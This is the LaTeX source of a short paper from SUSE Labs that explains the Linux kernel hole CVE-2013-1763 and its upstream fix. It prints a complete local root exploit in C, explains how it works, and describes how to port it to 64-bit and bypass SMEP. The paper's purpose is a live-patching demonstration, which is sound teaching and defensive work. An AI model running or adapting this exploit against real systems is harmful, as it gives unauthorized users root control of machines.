% vim: tw=78 ai spell spelllang=en sw=2

\documentclass[10pt]{llncs}
\usepackage{afterpage}
\usepackage{amsmath}
\usepackage{color}
\usepackage{url}
\usepackage[T1]{fontenc}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{hyperref}
\usepackage[all]{hypcap}
\usepackage{xspace}
\pagestyle{plain}

\lstset{language=C,tabsize=2,numbers=left,showstringspaces=false,
	breaklines=true,breakatwhitespace=true,escapeinside={(*@}{@*)},
	frame=l,captionpos=b,basicstyle=\sffamily\small}

\newcommand{\nb}[1]{\marginpar{\scriptsize #1}}
\renewcommand\note[1]{\nb{\textcolor{blue}{#1}}}
\newcommand\todo[1]{\nb{\textcolor{red}{#1}}}

\newcommand{\code}[2][]{\lstinline[columns=fullflexible, #1]$#2$}

\newcommand\kgr{\textsc{kGraft}\xspace}

\setcounter{tocdepth}{1}

\begin{document}

\title{Write an Exploit in 30 Minutes}
\author{Jiri~Slaby}
\institute{Suse Labs \\
\email{jslaby@suse.cz}}

\maketitle

\begin{abstract}
  Provided the most of the code present on this planet is written by humans,
  the code usually contains errors. Some errors are so serious, that they
  allow unauthorized users to become superusers. This often happens using evil
  programs, called \emph{exploits}. Writing an exploit is not an easy task.
  Even if bad guys know where an error in the code is, they are not
  necessarily able to abuse the error in an obvious way. To write an exploit,
  they usually need somewhat good knowledge of the system internals. This
  paper demonstrates a use case of writing such an exploit. We pick a known
  hole in the Linux kernel and explain how to gain administrator privileges
  leveraging the hole. We include also several main caveats which we met
  during the exploit development.
\end{abstract}

\section{Introduction} \label{sec:intro}
We are living in an environment which surrounds us by digital devices. These
predominantly contain code written by humans. With the human nature prone to
making errors occasionally, code in the devices contains errors too. Some are
benign, one cannot abuse them. Some are more serious and can cause bad glyphs
rendering for example. And last, some are dangerous which can allow users to
make the device malfunctioning temporarily or even permanently, or to take a
full control of the device with no limits. This category is looked for
especially by intruders, \emph{black hats}. These people study the code, find
such errors and try to invent a way to abuse the error. In many cases,
programs are written specifically for a particular error. We call them
\emph{exploits}.

Exploits are sometimes shared with the authors of the erroneous code.  There
even exists the Exploit Database~\cite{edb}. As of August 2014, it hosts over
30'000 exploits.  In this paper, we employ the database to find an error which
we use to teach the reader the basics of exploits. We then show him how to
write one for a serious error in the Linux kernel code.

\subsection{Picking the Exploit}
First, we must declare what was our primary goal to search for and write an
exploit. At SUSE, we are developing a mechanism to fix vulnerabilities in the
Linux kernel on the fly, i.e.\ without rebooting. We call it \kgr~\cite{kgr}.
Given a patch fixing some vulnerability, \kgr modifies the Linux kernel such
that any attempt to abuse the vulnerability is futile since the fix is
applied. To demonstrate the functionality, we needed a working use case: a
kernel with a severe error, an exploit to gain administrator privileges, and
an online patch to be applied by \kgr. Our requirements were:
\begin{itemize}
  \item 100\% working exploit to demonstrate \kgr on will,
  \item fast exploit to demonstrate the error quickly, and
  \item simple enough fix to explain watchers what is being fixed and how.
\end{itemize}

So after filtering some entries from the Exploit Database not meeting our
requirements, we chose an error in \code{__sock_diag_rcv_msg} described in
Section~\ref{sec:cve}.  Although we had an exploit from the database, it was
merely aimed at the 32-bit \texttt{x86} architecture. This means the exploit
was unusable on 64-bit machines which we all mostly own.  So we had to
investigate what it does (in Section~\ref{sec:exploit}) and later port it to
64-bit (cf.\ Section~\ref{sec:work}).

As a final note, let us shortly introduce the notion of numbering known
serious vulnerabilities which we use throughout the paper. The vulnerabilities
are assigned a unique CVE number~\cite{cve} and are also categorized using the
the CWE database~\cite{cwe} to determine severity and kind of error.  The
error we picked was given a number CVE-2013-1763 and is categorized as the
\emph{Input Validation} error, CWE-20. A curious reader can find more
information about the error and the categorization in the CVE and CWE
databases. In SUSE, we track the bug as bnc\#805633.

\section{CVE-2013-1763 Explained} \label{sec:cve}
\begin{figure}[htb]
  \begin{center}
    \begin{tabular}{c}
\begin{lstlisting}
static int __sock_diag_rcv_msg(struct sk_buff *skb,
                               struct nlmsghdr *nlh)
{
  int err;
  struct sock_diag_req *req = nlmsg_data(nlh);
  const struct sock_diag_handler *hndl;

  if (nlmsg_len(nlh) < sizeof(*req))
    return -EINVAL;

#if AFTER_FIXING_COMMIT_6e601a5356
	if (req->sdiag_family >= AF_MAX) (*@\label{line:check}@*)
		return -EINVAL;
#endif

  if (sock_diag_handlers[req->sdiag_family] == NULL) (*@\label{line:fetch1}@*)
	  request_module("net-pf-%d-proto-%d-type-%d", PF_NETLINK,
			  NETLINK_SOCK_DIAG, req->sdiag_family);

  mutex_lock(&sock_diag_table_mutex);
  hndl = sock_diag_handlers[req->sdiag_family]; (*@\label{line:fetch2}@*)
  if (hndl == NULL)
    err = -ENOENT;
  else
    err = hndl->dump(skb, nlh); (*@\label{line:dump}@*)
  mutex_unlock(&sock_diag_table_mutex);

  return err;
}
\end{lstlisting}
    \end{tabular}
  \end{center}
  \caption{Erroneous \code{__sock_diag_rcv_msg} with a fix for the
  CVE-2013-1763 error.  The fix is inside the \code{\#if section} to present
  the reader pre- and post- state.  (For better readability, we inlined
  \code{sock_diag_\{,un\}lock_handler} from the original code.)}
  \label{fig:hole}
\end{figure}

The core of the problem lays in the function \code{__sock_diag_rcv_msg},
depicted in Figure~\ref{fig:hole}.  This is a gateway for messages sent from
userspace via the Netlink~\cite{netlink} interface (\code{PF_NETLINK}) to the
diagnostic layer (\code{NETLINK_SOCK_DIAG}) in the kernel. The code checks
whether the user's message length is long enough and then immediately uses the
user's data \code{req->sdiag_family} as an index to the internal array
\code{sock_diag_handlers}. This happens on two lines: \ref{line:fetch1}
and~\ref{line:fetch2}.  The first occurrence is not of much interest for us.
Despite we can crash the kernel by passing down some defined value in
\code{req->sdiag_family}, it would result only in a \emph{Denial of Service}.
This can be accomplished e.g.\ by using
$-\frac{\text{\code{&sock_diag_handlers}}}{\text{\code{sizeof(void *)}}}$ to
zero the result and therefore let the kernel access the NULL pointer.

Our target is different. It is on line~\ref{line:dump}. The code there
transfers execution to the \code{dump} function obtained from the handler. But
as we pointed out already, the handler is computed as a result of the user's
provided data on line~\ref{line:fetch2}. So if a user could provide a proper
offset to \code{&sock_diag_handlers}, he would transfer execution to an
arbitrary address in the memory. How exactly to achieve this and write the
demanded exploit is described in the next section.

To complete the information about the exploit, the \emph{proper fix} for the
error is obvious. It depicted also in Figure~\ref{fig:hole}, inside the
only \code{\#if} section. This is a result of the upstream commit
\texttt{6e601a5356} (\code{sock_diag: Fix out-of-bounds access to
sock_diag_handlers\[\]}). It simply checks whether the user's provided index
is in bounds. And if not, the function is forced to return with a failure.

\section{Exploit} \label{sec:exploit}
\begin{figure}[t!]
  \begin{center}
    \begin{tabular}{c}
\begin{lstlisting}
int (*commit_creds)(unsigned long) = (void *)COMMIT_CREDS;
unsigned long (*prepare_kernel_cred)(unsigned long) =
    (void *)PREPARE_KERNEL_CRED;

int kernel_code() { (*@\label{line:kcode1}@*)
	commit_creds(prepare_kernel_cred(0));
	return -1;
} (*@\label{line:kcode2}@*)

int main() {
	unsigned long mmap_start = 0x10000, mmap_size =	0x120000;(*@\label{line:mmap_vars}@*)
	char jump[] = "\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3";(*@\label{line:jump_code}@*)
	unsigned long *jump4 = &jump[4];
	struct {
		struct nlmsghdr nlh;
		struct unix_diag_req r;
	} req;
	int fd;

	if ((fd=socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG))<0) (*@\label{line:socket}@*)
		return 1;

	memset(&req, 0, sizeof(req)); (*@\label{line:cr1}@*)
	req.nlh.nlmsg_len = sizeof(req);
	req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
	req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
	req.nlh.nlmsg_seq = 123456;
	req.r.sdiag_family = 81;(*@\label{line:cr2}@*)

	if (mmap((void *)mmap_start, mmap_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == MAP_FAILED)(*@\label{line:target1}@*)
		return 1;

	*jump4 = (unsigned long)kernel_code;(*@\label{line:patch_kc}@*)
	memset((void*)mmap_start, 0x90, mmap_size);
	memcpy((void*)mmap_start + mmap_size - sizeof(jump), jump, sizeof(jump));(*@\label{line:target2}@*)

	if (send(fd, &req, sizeof(req), 0) < 0) (*@\label{line:send}@*)
		return 1;

	if(!getuid())
		system("/bin/sh"); (*@\label{line:shell}@*)
}
\end{lstlisting}
    \end{tabular}
  \end{center}
  \caption{Exploit for the CVE-2013-1763 error.}
  \label{fig:exploit}
\end{figure}

The Exploit Database~\cite{edb} contained an exploit which is depicted in
Figure~\ref{fig:exploit}. In this section we explain what the exploit is
supposed to do. Initially, we start with an overview, where we summarize the
functionality in these three simple steps:\afterpage{\clearpage}
\begin{enumerate}
\item Reach the affected function \code{__sock_diag_rcv_msg} described in the
previous section. This is achieved by creating and sending a special Netlink
message to the kernel.

\item Hit the actual error by passing a specific value for
\code{req->sdiag_family} inside the Netlink message.

\item Finally, run a shell. This should be done with root privileges already,
if the exploit worked, of course.
\end{enumerate}

Here, the steps are elaborated in more detail, conveniently mapped to the
exploit's source code:
\begin{enumerate}
\item Lines \ref{line:kcode1}--\ref{line:kcode2} show the function
\code{kernel_code} which is used to elevate the privileges of the current
process. This has to run in the kernel space to be working properly. It calls
two kernel functions, which are at predefined locations, passed in through the
compiler (the addresses can be obtained from \code{System.map} for example).

\item Line \ref{line:socket} creates a socket, through which we pass the
message.

\item Lines \ref{line:cr1}--\ref{line:cr2} establish the message. Aside from
the required Netlink header fields (\code{req.nlh.*}), we also set the
\code{req.r.sdiag_family} member. The value is not random, it is precomputed.
See Section~\ref{sec:how} below for the details of computation.

\item Lines \ref{line:target1}--\ref{line:target2} set up the memory, where we
intend to transfer the execution from the kernel, exploiting the error. We
allocate a memory at a pre-defined address, using \code{mmap} and copy there
no-operation instructions. This is to allow jumping somewhere to the middle of
the space. Then, we put the code from \code{jump} at the end of the space.
Again, the low-level details of what this is for are further covered in
Section~\ref{sec:how}.

\item On line \ref{line:send}, we send the message, our \code{kernel_code}
should have elevated the privileges when this call returns.

\item Finally, with the privileges (if we succeeded), we call a root shell.

\end{enumerate}

\subsection{The Exploit Internals} \label{sec:how}
First, we used a magic number \code{81} for \code{req.r.sdiag_family} in
Figure~\ref{fig:exploit}, line~\ref{line:cr2}. Since the offset of \code{dump}
in \code{sock_diag_handlers}'s type is 4 on 32-bit, \code{hndl->dump} in
Figure~\ref{fig:hole}, line~\ref{line:dump}, transfers execution to the
address stored at \code{&sock_diag_handlers[x] + 4}, where \code{x} is passed
in by the attacker. But since \code{x}'s type is only \code{__u8} (8 bits,
unsigned), we cannot use \code{x} to directly access some attacker data
provided from userspace, where they would store the address of
\code{kernel_code} to jump to.

Instead, we use data stored at some near location accessible using the
\code{__u8} type. We chose \code{nl_table} for reasons presented further.
Therefore, the index is computed as:
\begin{equation*}
\text{\code{x}}=\frac{\text{\code{\&nl_table}} -
\text{\code{\&sock_diag_handlers}}} {\text{\code{sizeof(void *)}}}
\end{equation*}
It is 81 for the particular kernel the exploit was written and tested on. So,
\code{hndl = sock_diag_handlers[81]} gives us a pointer to \code{nl_table}.
\code{hndl->dump()} then loads a value stored in
\code{nl_table->hash.rehash_time} (offset 4 in \code{nl_table}) and jumps
there. The reason to select \code{nl_table} was the predictability of the
\code{rehash_time}'s value. It is initialized to \code{jiffies} and is set on
every Netlink message to \code{jiffies + 60 * HZ} (10 minutes in the future,
see \code{nl_portid_hash_rehash} in the kernel for reference). More
concretely, \code{hndl->dump()} forces the kernel to jump to addresses like
\code{0x124f8} and above.  This is exactly where we attempt to map the memory
for the privilege escalation code (\code{mmap} in Figure~\ref{fig:exploit},
line~\ref{line:target1}).

The only piece of code that remains to be explained, is the \code{jump}
variable and its byte sequence. Disassembling the byte sequence reveals us
more in Figure~\ref{fig:jump_code}.  The only purpose of this hunk is to call
a function on a given address. Here, it was encoded as an arbitrarily chosen
number \code{0x11111111}. But it is patched in \code{main} of
Figure~\ref{fig:exploit} on line~\ref{line:patch_kc} to correspond to the
function \code{kernel_code}, actually. So in the end, this small hunk takes
care of stack, calls \code{kernel_code}, restores the stack, and returns to
the caller (\code{__sock_diag_rcv_msg}, supposedly).

\begin{figure}[htb]
  \begin{center}
    \begin{tabular}{c}
\begin{lstlisting}[language={[x86masm]Assembler}]
55               push   %ebp
89 e5            mov    %esp,%ebp
b8 11 11 11 11   mov    $0x11111111,%eax
ff d0            call   *%eax
5d               pop    %ebp
c3               ret    
\end{lstlisting} %stopzone
    \end{tabular}
  \end{center}
  \caption{Jump code byte sequence unveiled.}
  \label{fig:jump_code}
\end{figure}

\section{Making it Work on 64-bit} \label{sec:work}
The exploit described in the previous section does not work on 64-bit of
\texttt{x86}. It results from some differences in the architectures. Let us go
through those we hit and fixed during the development:
\begin{itemize}
\item The address which is jumped to is elsewhere. \code{jiffies} are
\code{unsigned long} on 64-bit, but they are initialized to \code{(unsigned
long)(unsigned int) (-300 * HZ)}.  This means, that \code{rehash_time}
contains values like \code{0x1000124f8} and above. The \code{mmap_start} and
\code{mmap_size} values on Figure~\ref{fig:exploit}, line~\ref{line:mmap_vars}
have been altered accordingly, so that we now map the region
\code{0x100000000}--\code{0x102000000}.

\item The assembly of Figure~\ref{fig:jump_code} was simply converted to
64-bit \texttt{x86} by using proper registers and modifiers in
Figure~\ref{fig:jump_code64}. Note that we use a direct pointer to
\code{kernel_code} instead of online patching.

\begin{figure}[htb]
  \begin{center}
    \begin{tabular}{c}
\begin{lstlisting}
static void jump_payload_not_used() {
  asm volatile ("__jump:\n"
                "movq $kernel_code, %rax\n"
                "jmpq *%rax\n"
                "__jump_end:\n");
}
\end{lstlisting} %stopzone
    \end{tabular}
  \end{center}
  \caption{Code of Figure~\ref{fig:jump_code} converted to 64-bit.}
  \label{fig:jump_code64}
\end{figure}

\item Copying of the code from the \code{jump} byte sequence was replaced by a
sane copy of the code from Figure~\ref{fig:jump_code64}. See
Figure~\ref{fig:copying}.

\begin{figure}[htb]
  \begin{center}
    \begin{tabular}{c}
\begin{lstlisting}
void __jump(void);
void __jump_end(void);
const unsigned long jump_sz = __jump_end - __jump;
...
memcpy((void*)mmap_start + mmap_size - jump_sz,
      __jump, jump_sz);
\end{lstlisting}
    \end{tabular}
  \end{center}
  \caption{Code to copy code of Figure~\ref{fig:jump_code64} to the mapped
  memory.}
  \label{fig:copying}
\end{figure}

\end{itemize}

Despite applying all these, there is still a caveat. There are new mechanisms
on some current processors.  One of them is \emph{Supervisor-Mode Execution
Prevention}~\cite{intel} (SMEP). In short, such processors do not allow
anybody to execute a code loaded on user's pages in the kernel
(function \code{kernel_code} from our exploit in Figure~\ref{fig:exploit}).
Attempt to do so causes a page fault instead and the exploit is killed rather
than finishes successfully.  The simple workaround for the demonstration
purposes is to pass \code{nosmep} to the kernel command line.

\section{Conclusion}
Vulnerabilities in the kernels of operating systems are severe problems. We
have shown, that writing an exploit for such an error may be an easy task in
some cases. Especially, when the vulnerability in the kernel can be easily
abused, like CVE-2013-1763 allows us. We demonstrated that it is even easier
thanks to publicly available exploits in the Exploit Database~\cite{edb}.

Taking the actual threat of exploits into account, it is a great motivation to
have mechanisms like testing~\cite{dynamic} and static code
analysis~\cite{static} to find such errors before the product is shipped. Or
in worse cases, to provide services like \kgr~\cite{kgr} to fix such
vulnerabilities on the fly when the products are employed and running already.
Finally, we have to note, that it was fun to debug and prepare the exploit for
the \kgr demonstration.

\section*{Availability}
All, a SLE12-based kernel with the CVE-2013-1763 fix reverted, the exploit
for 64-bit \texttt{x86}, and a \kgr patch containing the fix can be found in
the \emph{Internal Build System} (IBS). There is also a pre-installed virtual
machine:
\begin{center}
  \url{http://build.suse.de/project/show/home:jirislaby:sle12-exploit}
\end{center}

\bibliographystyle{plain}
\bibliography{exploit}

\end{document}
